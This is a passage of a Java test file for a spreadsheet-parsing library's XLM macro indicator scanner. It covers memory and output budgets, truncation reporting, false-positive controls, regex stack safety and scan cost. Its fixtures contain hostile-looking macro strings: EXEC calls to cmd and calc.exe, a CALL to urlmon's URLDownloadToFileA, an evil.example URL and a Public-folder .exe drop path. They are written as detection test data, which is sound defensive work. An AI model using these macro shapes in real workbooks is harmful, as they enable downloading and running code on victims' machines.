        for (String[] shape : shapes) {
            XSSFExcelExtractorDecorator.ValueCharBudget budget =
                    new XSSFExcelExtractorDecorator.ValueCharBudget(1 << 20);
            XlmXmlMacrosheetParser parser = parseRowXmlWithValueBudget(shape[1], budget);
            int stored = parser.getValues().values().stream().mapToInt(String::length).sum();
            assertEquals(stored, ((Integer) retained.get(budget)).intValue(),
                    "VALUE budget charge != stored for shape '" + shape[0] + "'; stored " + stored
                            + ", entries " + parser.getValues());
        }
    }

    /** And when the value budget REFUSES, the refusal must not be charged. */
    @Test
    void testValueBudgetChargeEqualsStoredWhenItRefuses() throws Exception {
        StringBuilder row = new StringBuilder();
        for (int i = 1; i <= 30; i++) {
            row.append("<c r=\"A").append(i).append("\" t=\"str\"><v>")
                    .append("V".repeat(50)).append("</v></c>");
        }
        XSSFExcelExtractorDecorator.ValueCharBudget budget =
                new XSSFExcelExtractorDecorator.ValueCharBudget(200);
        XlmXmlMacrosheetParser parser = parseRowXmlWithValueBudget(row.toString(), budget);

        java.lang.reflect.Field retained =
                XSSFExcelExtractorDecorator.ValueCharBudget.class.getDeclaredField("retained");
        retained.setAccessible(true);
        int stored = parser.getValues().values().stream().mapToInt(String::length).sum();
        assertEquals(stored, ((Integer) retained.get(budget)).intValue(),
                "refused values must not be charged; stored " + stored);
        assertTrue(((Integer) retained.get(budget)).intValue() <= 200, "and the cap must hold");
        assertTrue(parser.isTruncated(), "and the refusal must be reported");
    }

    // ── Gate 3: every flag needs a negative control on LEGITIMATE input ──────

    /**
     * None of the XLM signals may fire on an ORDINARY macro-bearing workbook.
     *
     * <p>Four defects in this work were a flag set from the wrong condition, and the worst of them
     * -- 66 of 1,961 real documents reported as structurally malformed -- was caught only by the
     * corpus, because no test asserted the negative. A flag that fires on ordinary input is worse
     * than no flag: it trains an analyst to ignore it.
     */
    @Test
    void testNoSignalFiresOnLegitimateWorkbookShapes() throws Exception {
        String[][] legit = {
            {"formula then value", "<f>=EXEC(\"a\")</f><v>0</v>"},
            {"value only", "<v>123</v>"},
            {"shared string", "<v>0</v>"},
            {"inline string", "<is><t>plain</t></is>"},
            {"rich text", "<is><r><t>ab</t></r><r><t>cd</t></r></is>"},
            {"furigana", "<is><t>real</t><rPh sb=\"0\" eb=\"2\"><t>furi</t></rPh>"
                    + "<phoneticPr fontId=\"1\"/></is>"},
            {"error value", "<v>#REF!</v>"},
            {"empty formula", "<f></f><v>0</v>"},
            {"shared formula follower", "<f t=\"shared\" si=\"0\"/><v>5</v>"},
        };
        for (String[] shape : legit) {
            Metadata metadata = new Metadata();
            String out = processMacroSheets(metadata, new String[] {"sheet1"},
                    new String[] {cellXmlDoc(shape[0].contains("shared string")
                            ? shape[1] : shape[1], null)});
            assertFalse(Boolean.parseBoolean(metadata.get("msoffice:xlm-structural-anomaly")),
                    "anomaly flag must NOT fire on legitimate shape '" + shape[0] + "'");
            assertFalse(Boolean.parseBoolean(
                            metadata.get("msoffice:xlm-capture-limit-reached")),
                    "capture-limit flag must NOT fire on legitimate shape '" + shape[0] + "'");
            assertNull(metadata.get(TikaCoreProperties.TRUNCATED_METADATA),
                    "TRUNCATED_METADATA must NOT be set for legitimate shape '" + shape[0]
                            + "'; output was:\n" + out);
        }
    }

    /** A macro part sharing a WORKSHEET's name is normal -- it must not be flagged. */
    @Test
    void testMacroPartNamedAfterAWorksheetIsNotFlagged() throws Exception {
        // Measured on 66 of 1,961 real corpus documents, so this shape MUST stay unflagged.
        Metadata metadata = new Metadata();
        processMacroSheets(metadata, new String[] {"sheet1"},
                new String[] {cellXmlDoc("<f>=EXEC(\"a\")</f>", null)});
        assertFalse(Boolean.parseBoolean(metadata.get("msoffice:xlm-structural-anomaly")),
                "a macro part named like a worksheet is ordinary and must not be flagged");
    }

    // ── Gate 4: a property claimed over a SET is tested over the whole set ───

    /**
     * {@code SPLIT_MARKER} must not bridge any indicator pattern it can actually reach.
     *
     * <p>Scoped by where joining still HAPPENS, which mutation testing forced me to get right: a
     * first version of this test split across duplicate {@code <f>} elements and was VACUOUS,
     * because those are now retained as separate entries and never joined -- so replacing the marker
     * with a bare space left it green. The marker survives only on the VALUE path (duplicate
     * {@code <v>}/{@code <is>} joined in flushCell), and the patterns matched against cell values
     * are URL, IP_HOST and DROP_PATH. Those are the set, and all of them are tested.
     *
     * <p>The quoted-argument family (EXEC/EXECUTE/CALL/REGISTER/FOPEN/FWRITE/ALERT) is matched only
     * against FORMULA text, which no longer joins at all -- so it is unreachable by construction
     * rather than defended by this test. {@code testSplitHalvesCannotBeJoinedIntoAFabricatedIoc}
     * pins that separately, including the entry count that proves no join occurred.
     *
     * <p>Each half is chosen so it matches NOTHING on its own: otherwise the scanner extracting it
     * is correct behaviour, not a bridge. That mistake failed this test's first run on the URL case.
     *
     * <p>HONEST LIMIT, established by mutation: this test does NOT currently detect a weakening of
     * the separator. Replacing SPLIT_MARKER with a bare space leaves it green, because all three
     * value patterns exclude whitespace by construction ({@code [^\s"<>()]+} and a dotted-quad),
     * so the marker's distinctiveness is not load-bearing on this path. The separator's form WAS
     * load-bearing for the quoted-argument family, whose capture group {@code ((?:[^"]|"")*)}
     * matches anything -- and that family is now defended by NOT JOINING formulas at all, which
     * {@code testSplitHalvesCannotBeJoinedIntoAFabricatedIoc} pins via its entry-count assertion
     * (mutation-verified RED). This test is kept as a cheap guard for the day someone adds a
     * whitespace-tolerant value pattern; it is not evidence that the marker is safe.
     */
    @Test
    void testSplitMarkerBridgesNoValuePatternInTheWholeFamily() throws Exception {
        String[][] family = {
            {"URL", "htt", "p://evil.example/x"},
            {"IPV4", "1.2.", "3.4/x"},
            {"DROP_PATH", "C:\\\\Users\\\\Public\\\\p", ".exe"},
        };
        for (String[] f : family) {
            // Duplicate <v> in one cell: flushCell joins them with SPLIT_MARKER.
            XlmXmlMacrosheetParser parser = parseRowXml(
                    "<c r=\"A1\" t=\"str\"><v>" + f[1] + "</v><v>" + f[2] + "</v></c>");
            String joined = String.join(" | ", parser.getValues().values());
            assertTrue(joined.contains(f[1]) && joined.contains(f[2]),
                    f[0] + ": both halves must be retained as evidence; got: " + joined);

            List<String> iocs = XlmXmlIocScanner.scan(Map.of("Macro1:1:B1", "=1+1"),
                    parser.getValues());
            assertTrue(iocs.isEmpty(),
                    f[0] + ": the two halves must NOT be joined into an indicator the document "
                            + "never contained; got: " + iocs + " from value: " + joined);

            // Control: the same text WITHOUT the split must be found, so the fixture is real.
            List<String> whole = XlmXmlIocScanner.scan(Map.of("Macro1:1:B1", "=1+1"),
                    Map.of("Macro1:1:A1", f[1] + f[2]));
            assertFalse(whole.isEmpty(),
                    f[0] + ": control -- unsplit, this text MUST produce an indicator, else the "
                            + "fixture proves nothing");
        }
    }

    // ── Gate 1 extension: the remaining repeatable dimensions ────────────────

    /** Cells per row -- an ordinary dimension, but the document chooses the count. */
    @Test
    void testManyDistinctCellsCostIsSubQuadratic() {
        assertSubQuadratic("distinct cells per row", 8000,
                n -> {
                    StringBuilder row = new StringBuilder();
                    for (int i = 1; i <= n; i++) {
                        row.append("<c r=\"A").append(i).append("\"><f>=1</f></c>");
                    }
                    return "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/"
                            + "2006/main\"><sheetData><row r=\"1\">" + row
                            + "</row></sheetData></worksheet>";
                },
                XlmEvasionResilienceTest::parsePrepared);
    }

    /** Rows per sheet. */
    @Test
    void testManyRowsCostIsSubQuadratic() {
        assertSubQuadratic("rows per sheet", 8000,
                n -> {
                    StringBuilder sd = new StringBuilder();
                    for (int i = 1; i <= n; i++) {
                        sd.append("<row r=\"").append(i).append("\"><c r=\"A").append(i)
                                .append("\"><f>=1</f></c></row>");
                    }
                    return "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/"
                            + "2006/main\"><sheetData>" + sd + "</sheetData></worksheet>";
                },
                XlmEvasionResilienceTest::parsePrepared);
    }

    // ── The IOC output budget, with all four gates applied ───────────────────

    /** The scan ceiling must track the CAPTURE cap, and cutting the scan input must be reported. */
    @Test
    void testScanCeilingTracksCaptureCapAndReportsTruncation() {
        int scanCap = XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN;
        String formula = "=" + "A".repeat(scanCap + 64) + "&EXEC(\"" + PAYLOAD + "\")";
        Map<String, String> formulas = Map.of("Macro1:1:1", formula);

        int[] truncations = new int[1];
        List<String> atDefault = XlmXmlIocScanner.scan(
                formulas, Map.of(), scanCap, () -> truncations[0]++, 0, 0, null);
        assertEquals(1, truncations[0], "cutting the scan input must be REPORTED");
        assertTrue(atDefault.stream().noneMatch(x -> x.contains(PAYLOAD)),
                "control: at the default ceiling the tail payload is genuinely missed, so this "
                        + "fixture exercises the cap rather than passing vacuously");

        int[] none = new int[1];
        List<String> raised = XlmXmlIocScanner.scan(
                formulas, Map.of(), formula.length(), () -> none[0]++, 0, 0, null);
        assertEquals(0, none[0], "nothing was cut, so nothing may be reported");
        assertTrue(raised.stream().anyMatch(x -> x.contains(PAYLOAD)),
                "with the ceiling raised to the capture cap the payload must be found");
    }

    /**
     * GATE 2 for this budget: emitted entries must never exceed either bound.
     *
     * <p>The formulas must yield DISTINCT indicators. This fixture used 400 copies of
     * {@code =EXEC(A1)} against a single A1 value, which pressured the bound only because the
     * scanner emitted the same indicator 400 times; once duplicates are collapsed -- 400 copies of
     * one EXEC being one piece of evidence -- that fixture produces exactly ONE entry, drops
     * nothing, and stops testing either bound. Distinct payloads keep the gate meaning what its
     * name says.
     */
    @Test
    void testIocOutputRespectsBothBoundsAndReportsTheDrop() {
        Map<String, String> formulas = new java.util.LinkedHashMap<>();
        for (int i = 1; i <= 400; i++) {
            formulas.put("Macro1:" + i + ":A" + i, "=EXEC(A" + i + ")");
        }
        Map<String, String> values = new java.util.LinkedHashMap<>();
        for (int i = 1; i <= 400; i++) {
            values.put("Sheet1:" + i + ":A" + i, "payload-" + i + "-" + "X".repeat(1024));
        }

        int[] limited = new int[1];
        List<String> bounded = XlmXmlIocScanner.scan(formulas, values,
                XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 50, 8192, () -> limited[0]++);
        assertEquals(1, limited[0], "dropping indicators must be REPORTED");
        assertTrue(bounded.size() <= 50, "entry bound holds; got " + bounded.size());
        assertTrue(bounded.stream().mapToInt(String::length).sum() <= 8192, "char bound holds");
        assertFalse(bounded.isEmpty(), "and the bound must not empty the list");
    }

    /**
     * GATE 3 for this budget: the limit must NOT be reported when nothing was dropped. Reporting
     * from a saturation test rather than a refusal put TRUNCATED_METADATA on complete extractions.
     */
    @Test
    void testIocLimitIsNotReportedWhenNothingWasDropped() {
        Map<String, String> values = new java.util.LinkedHashMap<>();
        values.put("Sheet1:1:A1", "http://a.example/1");
        values.put("Sheet1:1:A2", "http://a.example/2");
        int[] limited = new int[1];
        List<String> out = XlmXmlIocScanner.scan(Map.of("Macro1:1:A1", "=1+1"), values,
                XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 2, 1 << 20, () -> limited[0]++);
        assertEquals(2, out.size(), "both fit exactly");
        assertEquals(0, limited[0], "`limited` must mean REFUSED, not merely saturated");
    }

    /**
     * One OVERSIZED indicator must not suppress the shorter ones behind it. Treating any refusal as
     * "full" stopped the scan dead -- flagged independently by two reviewer families -- while the
     * opposite error (never becoming full) was the OOM. The floor resolves both.
     */
    @Test
    void testOneOversizedIndicatorDoesNotSuppressLaterSmallerOnes() {
        Map<String, String> formulas = new java.util.LinkedHashMap<>();
        formulas.put("Macro1:1:A1", "=EXEC(\"" + "G".repeat(4000) + "\")");
        formulas.put("Macro1:2:A2", "=EXEC(\"" + PAYLOAD + "\")");

        int[] limited = new int[1];
        // Room for the short one but not the giant.
        List<String> out = XlmXmlIocScanner.scan(formulas, Map.of(),
                XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 4096, 500, () -> limited[0]++);

        assertTrue(out.stream().anyMatch(x -> x.contains(PAYLOAD)),
                "the SHORT high-value indicator must survive a refused giant; got: " + out);
        assertEquals(1, limited[0], "and the giant's refusal must still be reported");
    }

    /** Cross-cell fairness must hold at ANY cell count -- the quota is adaptive. */
    @Test
    void testHighValueIndicatorsAreFairAcrossCellsAtSeveralScales() {
        for (int cells : new int[] {2, 50, 2000}) {
            Map<String, String> formulas = new java.util.LinkedHashMap<>();
            StringBuilder packed = new StringBuilder("=");
            for (int i = 0; i < 400; i++) {
                packed.append("EXEC(\"j").append(i).append("\")&");
            }
            formulas.put("Macro1:0:A0", packed.toString());
            for (int c = 1; c < cells; c++) {
                formulas.put("Macro1:" + c + ":A" + c, "=EXEC(\"tail" + c + "\")");
            }
            List<String> out = XlmXmlIocScanner.scan(formulas, Map.of(),
                    XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 200, 1 << 20, null);
            long distinctCells = out.stream().filter(x -> x.startsWith("EXEC: tail")).count();
            if (cells <= 200) {
                // Room for every cell: the last one must be present, not merely represented.
                assertTrue(out.stream().anyMatch(x -> x.contains("tail" + (cells - 1))),
                        "with " + cells + " cells and a 200-entry budget the LAST cell's EXEC must "
                                + "survive the first cell's volume; got " + out.size());
            } else {
                // More cells than budget: no arithmetic can represent them all, so the property
                // that matters is that the budget is SPREAD rather than spent inside one cell.
                assertTrue(distinctCells >= 100,
                        "with " + cells + " cells the budget must spread across many of them, not "
                                + "be consumed by the packed first cell; only " + distinctCells
                                + " tail cells represented out of " + out.size() + " entries");
            }
        }
    }

    /** No indicator may be emitted TWICE -- the duplication three reviewer families flagged. */
    @Test
    void testNoIndicatorIsEmittedTwice() {
        Map<String, String> formulas = new java.util.LinkedHashMap<>();
        // A cell whose high-value match count exceeds any per-cell quota, so the deferral path
        // (which used to re-emit from the start) is exercised.
        StringBuilder packed = new StringBuilder("=");
        for (int i = 0; i < 50; i++) {
            packed.append("EXEC(\"k").append(i).append("\")&");
        }
        formulas.put("Macro1:1:A1", packed.toString());
        formulas.put("Macro1:2:A2", "=EXEC(\"other\")");

        List<String> out = XlmXmlIocScanner.scan(formulas, Map.of(),
                XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 4096, 1 << 20, null);
        assertEquals(new java.util.HashSet<>(out).size(), out.size(),
                "every indicator must appear at most once; duplicates: " + (out.size()
                        - new java.util.HashSet<>(out).size()) + " of " + out.size());
    }

    /** GATE 1 for this budget: the value scan is the dimension where two OOMs lived. */
    @Test
    void testCellValueScanCostIsSubQuadratic() {
        assertSubQuadratic("cell values scanned", 40000,
                n -> {
                    Map<String, String> values = new java.util.LinkedHashMap<>();
                    for (int i = 0; i < n; i++) {
                        values.put("Sheet1:1:A" + i, "http://evil.example/" + i);
                    }
                    return values;
                },
                values -> XlmXmlIocScanner.scan(Map.of("Macro1:1:A1", "=1+1"), values,
                        XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 4096, 1 << 20, null));
    }

    /**
     * The scan's WORST case is text that does NOT match, and the dimension above cannot see it.
     *
     * <p>A match fills the sink, and a full sink stops the walk -- so a fixture made of indicators
     * measures the cheap path. Measured: 20,000 to 80,000 matching values is FLAT at ~20 ms because
     * the sink fills at 4,096 entries and the walk halts, while the same volume of NON-matching
     * values costs 57 -> 115 -> 227 ms, every byte of it scanned. Linear, so not a defect, but the
     * only thing keeping it bounded is the retained-text aggregate (32 MB of values, 10 MB of
     * formulas), which makes the true worst case ~2.7 seconds of CPU on one crafted workbook
     * against ~30 ms for an ordinary one.
     *
     * <p>Pinned here so that neither a change that makes non-matching scanning superlinear nor a
     * raise of those aggregates can pass unnoticed. The same blind spot on the VBA path -- a gate
     * written against matching input -- hid a scan that took 7.2 seconds.
     */
    @Test
    void testNonMatchingCellValueScanCostIsSubQuadratic() {
        assertSubQuadratic("non-matching cell values scanned", 40000,
                n -> {
                    Map<String, String> values = new java.util.LinkedHashMap<>();
                    for (int i = 0; i < n; i++) {
                        values.put("Sheet1:1:A" + i,
                                "just some ordinary spreadsheet text value number " + i);
                    }
                    return values;
                },
                values -> XlmXmlIocScanner.scan(Map.of("Macro1:1:A1", "=1+1"), values,
                        XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 4096, 1 << 20, null));
    }

    /** The formula pass has the same asymmetry, and a much larger per-byte constant. */
    @Test
    void testNonMatchingFormulaScanCostIsSubQuadratic() {
        StringBuilder longFormula = new StringBuilder("=");
        while (longFormula.length() < XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN) {
            longFormula.append("CONCATENATE(\"abcdefgh\",");
        }
        final String formula = longFormula.toString();
        assertSubQuadratic("non-matching formulas scanned", 8,
                n -> {
                    Map<String, String> formulas = new java.util.LinkedHashMap<>();
                    for (int i = 0; i < n; i++) {
                        formulas.put("Macro1:1:A" + i, formula);
                    }
                    return formulas;
                },
                formulas -> XlmXmlIocScanner.scan(formulas, Map.of(),
                        XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 4096, 1 << 20, null));
    }

    /** And with a budget nothing can fit, the walk must STOP rather than build rejects. */
    @Test
    void testUnfittableBudgetStopsScanningTheValueCorpus() {
        int n = 20_000;
        final int[] visited = new int[1];
        Map<String, String> backing = new java.util.LinkedHashMap<>();
        for (int i = 0; i < n; i++) {
            backing.put("Sheet1:1:A" + i, "http://evil.example/" + i);
        }
        Map<String, String> counted = new java.util.AbstractMap<String, String>() {
            @Override
            public java.util.Set<Map.Entry<String, String>> entrySet() {
                return backing.entrySet();
            }

            @Override
            public java.util.Collection<String> values() {
                java.util.List<String> vals = new java.util.ArrayList<>(backing.values());
                return new java.util.AbstractList<String>() {
                    @Override
                    public String get(int i) {
                        return vals.get(i);
                    }

                    @Override
                    public int size() {
                        return vals.size();
                    }

                    @Override
                    public java.util.Iterator<String> iterator() {
                        java.util.Iterator<String> it = vals.iterator();
                        return new java.util.Iterator<String>() {
                            @Override
                            public boolean hasNext() {
                                return it.hasNext();
                            }

                            @Override
                            public String next() {
                                visited[0]++;
                                return it.next();
                            }
                        };
                    }
                };
            }
        };

        List<String> out = XlmXmlIocScanner.scan(Map.of("Macro1:1:A1", "=1+1"), counted,
                XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 4096, 4, null);
        assertTrue(out.isEmpty(), "nothing fits a 4-char budget; got " + out.size());
        assertTrue(visited[0] < 100,
                "the walk must stop, not build rejects for all " + n + " values; visited "
                        + visited[0]);
    }

    /**
     * A long quoted argument must not crash the scanner.
     *
     * <p>The quoted-argument patterns were written {@code (?:[^"]|"")*} -- an alternation inside a
     * star, which java.util.regex implements by RECURSING once per iteration. Rewritten as
     * {@code [^"]*+(?:""[^"]*+)*}: the same language, no recursion, and possessive so the engine
     * does not explore the exponentially many ways to split a run of non-quote characters.
     *
     * <p>HONEST LIMIT: this test is NOT a reliable regression guard for the overflow, and mutation
     * proved it -- restoring the recursive pattern leaves it GREEN, because surefire's forked JVM
     * runs with more stack headroom than a default launcher. The defect is real and was measured
     * deterministically at the regex level on the default stack:
     * <pre>
     *   recursive  len=1000 matched | 4000, 20000, 100000, 400000 -> StackOverflowError
     *   possessive len=1000..400000 -> matched
     * </pre>
     * StackOverflowError is an Error, so in production it escapes the per-part recovery and takes
     * the whole parse down. What this test DOES guard is that long arguments are still extracted;
     * the equivalence test next to it guards that the rewrite matches the same language. The
     * overflow itself is guarded by the measurement above being recorded, not by an assertion.
     */
    @Test
    void testLongQuotedArgumentDoesNotOverflowTheStack() {
        for (int len : new int[] {4_000, 64_000, 250_000}) {
            String arg = "G".repeat(len);
            List<String> iocs = XlmXmlIocScanner.scan(
                    Map.of("Macro1:1:A1", "=EXEC(\"" + arg + "\")"), Map.of(),
                    Integer.MAX_VALUE, null, 4096, Integer.MAX_VALUE, null);
            assertTrue(iocs.stream().anyMatch(x -> x.startsWith("EXEC: G")),
                    "a " + len + "-char argument must still be extracted; got " + iocs.size()
                            + " indicators");
        }
    }

    /** The rewritten patterns must match EXACTLY what the recursive form matched. */
    @Test
    void testQuotedArgumentPatternsStillMatchTheSameLanguage() {
        String[][] cases = {
            {"plain", "=EXEC(\"calc.exe\")", "EXEC: calc.exe"},
            {"doubled quote", "=EXEC(\"say \"\"hi\"\"\")", "EXEC: say \"hi\""},
            {"empty argument", "=EXEC(\"\")", "EXEC: "},
            {"leading spaces", "=EXEC(   \"calc\")", "EXEC: calc"},
            {"embedded parens", "=EXEC(\"cmd /c (dir)\")", "EXEC: cmd /c (dir)"},
            {"call two args", "=CALL(\"urlmon\",\"URLDownloadToFileA\")",
                "CALL: urlmon!URLDownloadToFileA"},
        };
        for (String[] c : cases) {
            List<String> iocs = XlmXmlIocScanner.scan(
                    Map.of("Macro1:1:A1", c[1]), Map.of());
            assertTrue(iocs.contains(c[2]),
                    c[0] + ": expected \"" + c[2] + "\" from " + c[1] + "; got " + iocs);
        }
    }

    // ── The settled retention semantics, in ONE place ────────────────────────

    /**
     * THE INVARIANT: {@code getRetainedFormulaChars()} equals the sum of the lengths of everything
     * in {@code getFormulas()}, on every path.
     *
     * <p>This exists as ONE table-driven test on purpose. The retention policy for duplicated cell
     * refs was changed three times across review rounds -- replace (a last-wins evasion), then
     * concatenate (quadratic, OOM), then distinct keys -- and each change silently invalidated
     * per-shape assertions written for the previous one, costing five test rewrites. An invariant
     * survives a policy change; "retained <= 500" does not. Anything that alters retention must
     * satisfy THIS, and if it cannot, that is the design discussion the change needs.
     *
     * <p>It catches both directions: gross charging (billing for content not kept) and
     * under-charging (keeping content that was never billed, i.e. a budget escape).
     */
    @Test
    void testChargeEqualsStoredAcrossEveryRetentionPath() throws Exception {
        String[][] shapes = {
            {"single formula", "<c r=\"A1\"><f>=EXEC(\"a\")</f></c>"},
            {"duplicate ref", "<c r=\"A1\"><f>=EXEC(\"a\")</f></c><c r=\"A1\"><f>=1+1</f></c>"},
            {"triplicate ref", "<c r=\"A1\"><f>=A</f></c><c r=\"A1\"><f>=B</f></c>"
                    + "<c r=\"A1\"><f>=C</f></c>"},
            {"nested cell", "<c r=\"A1\"><f>=EXEC(\"a\")</f><c r=\"B1\"><f>=b</f></c></c>"},
            {"no @r", "<c><f>=EXEC(\"a\")</f></c><c><f>=EXEC(\"b\")</f></c>"},
            {"duplicate <f> in one cell", "<c r=\"A1\"><f>=EXEC(\"a\")</f><f>=1+1</f></c>"},
            {"nested <v> suppressed", "<c r=\"A1\"><f>=EXEC(\"a\")<v>0</v></f></c>"},
            {"empty formula", "<c r=\"A1\"><f></f></c>"},
            {"document-supplied #2 key", "<c r=\"A1#2\"><f>=x</f></c><c r=\"A1\"><f>=y</f></c>"
                    + "<c r=\"A1\"><f>=z</f></c>"},
            {"value only", "<c r=\"A1\" t=\"str\"><v>plain</v></c>"},
        };
        for (String[] shape : shapes) {
            XlmXmlMacrosheetParser parser = parseRowXml(shape[1]);
            int stored = parser.getFormulaList().stream().mapToInt(String::length).sum();
            assertEquals(stored, parser.getRetainedFormulaChars(),
                    "CHARGE != STORED for shape '" + shape[0] + "': charged "
                            + parser.getRetainedFormulaChars() + ", stored " + stored
                            + ", entries " + parser.getFormulas());
        }
    }

    /** The same invariant when the caps BITE -- refusals must not be charged. */
    @Test
    void testChargeEqualsStoredWhenCapsRefuseEntries() throws Exception {
        // Aggregate cap admits some entries and refuses later ones; per-formula cap forces the
        // truncation marker onto what is admitted. Both must be accounted exactly.
        StringBuilder row = new StringBuilder();
        for (int i = 1; i <= 40; i++) {
            row.append("<c r=\"A").append(i).append("\"><f>=").append("Z".repeat(120))
                    .append("</f></c>");
        }
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\"><sheetData><row r=\"1\">" + row + "</row></sheetData></worksheet>";
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null, 10, 10, 64, 64, 500);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        int stored = parser.getFormulaList().stream().mapToInt(String::length).sum();
        assertEquals(stored, parser.getRetainedFormulaChars(),
                "refused and truncated entries must be accounted exactly; charged "
                        + parser.getRetainedFormulaChars() + ", stored " + stored);
        assertTrue(parser.getRetainedFormulaChars() <= 500,
                "and the aggregate cap must hold; charged " + parser.getRetainedFormulaChars());
        assertTrue(parser.isTruncated(), "evidence WAS withheld here, so it must be reported");
        assertTrue(parser.getFormulas().size() <= 10, "and the entry cap must hold");
    }

    // ── helpers ─────────────────────────────────────────────────────────────
    /** Parse one row with a caller-supplied ValueCharBudget, so its accounting can be inspected. */
    private static XlmXmlMacrosheetParser parseRowXmlWithValueBudget(
            String rowChildren, XSSFExcelExtractorDecorator.ValueCharBudget budget)
            throws Exception {
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\"><sheetData><row r=\"1\">" + rowChildren
                + "</row></sheetData></worksheet>";
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null, 4096, 4096, 16384, 1024, 1 << 20, budget);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();
        return parser;
    }

    /** Parse a macrosheet whose single <row r="1"> contains the given raw cell markup. */
    private static XlmXmlMacrosheetParser parseRowXml(String rowChildren) throws Exception {
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\"><sheetData><row r=\"1\">" + rowChildren
                + "</row></sheetData></worksheet>";
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();
        return parser;
    }


    private static long usedHeap() {
        Runtime rt = Runtime.getRuntime();
        for (int i = 0; i < 3; i++) {
            rt.gc();
        }
        return rt.totalMemory() - rt.freeMemory();
    }

    private static Biff12XlmFormulaDecoder.EvalContext newCtx() {
        return new Biff12XlmFormulaDecoder.EvalContext(new HashMap<>(), new HashMap<>());
    }

    /** PtgFuncVar(argc=0, NOW=0x004A). */
    private static byte[] nowFormula() {
        return ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN)
                .put((byte) 0x22).put((byte) 0).putShort((short) 0x004A).array();
    }

    private static Object evalNow() {
        return Biff12XlmFormulaDecoder.evaluateFormula(nowFormula(), newCtx());
    }


    private static String onlyFormula(XlmXmlMacrosheetParser parser) {
        return parser.getFormulaList().stream().findFirst().orElse("");
    }

    private static String cellXmlDoc(String cellChildren, String cellType) {
        return String.format(Locale.ROOT, """
                <worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
                  <sheetData><row r="1"><c r="A1"%s>%s</c></row></sheetData>
                </worksheet>
                """, cellType == null ? "" : " t=\"" + cellType + "\"", cellChildren);
    }

    private static XlmXmlMacrosheetParser parseCellXml(String cellChildren) throws Exception {
        return parseCellXml(cellChildren, null);
    }

    private static XlmXmlMacrosheetParser parseCellXml(String cellChildren, String cellType)
            throws Exception {
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(
                        cellXmlDoc(cellChildren, cellType).getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();
        return parser;
    }

    /** Same, but at explicit part PATHS so a basename collision can be constructed. */
    private static String processMacroSheetsAtPaths(Metadata metadata, String[] paths,
                                                    String[] xml) throws Exception {
        ParseContext parseContext = new ParseContext();
        ToXMLContentHandler output = new ToXMLContentHandler();
        XHTMLContentHandler xhtml =
                new XHTMLContentHandler(output, metadata, parseContext);
        try (ByteArrayOutputStream packageBytes = new ByteArrayOutputStream();
             OPCPackage opcPackage = OPCPackage.create(packageBytes)) {
            for (int i = 0; i < paths.length; i++) {
                PackagePart part = opcPackage.createPart(
                        PackagingURIHelper.createPartName(paths[i]),
                        XSSFRelation.MACRO_SHEET_XML.getContentType());
                try (OutputStream stream = part.getOutputStream()) {
                    stream.write(xml[i].getBytes(StandardCharsets.UTF_8));
                }
            }
            XSSFExcelExtractorDecorator decorator =
                    new XSSFExcelExtractorDecorator(parseContext, opcPackage, Locale.ROOT);
            decorator.metadata = metadata;
            Method process = XSSFExcelExtractorDecorator.class.getDeclaredMethod(
                    "processXlmXmlMacroSheets", OPCPackage.class,
                    XHTMLContentHandler.class, XSSFSharedStringsShim.class);
            process.setAccessible(true);

            xhtml.startDocument();
            process.invoke(decorator, opcPackage, xhtml, null);
            xhtml.endDocument();
        }
        return output.toString();
    }

    /** Run the real multi-part macrosheet loop over the given parts, in name order. */
    private static String processMacroSheets(Metadata metadata, String[] names, String[] xml)
            throws Exception {
        ParseContext parseContext = new ParseContext();
        ToXMLContentHandler output = new ToXMLContentHandler();
        XHTMLContentHandler xhtml =
                new XHTMLContentHandler(output, metadata, parseContext);
        try (ByteArrayOutputStream packageBytes = new ByteArrayOutputStream();
             OPCPackage opcPackage = OPCPackage.create(packageBytes)) {
            for (int i = 0; i < names.length; i++) {
                PackagePart part = opcPackage.createPart(
                        PackagingURIHelper.createPartName(
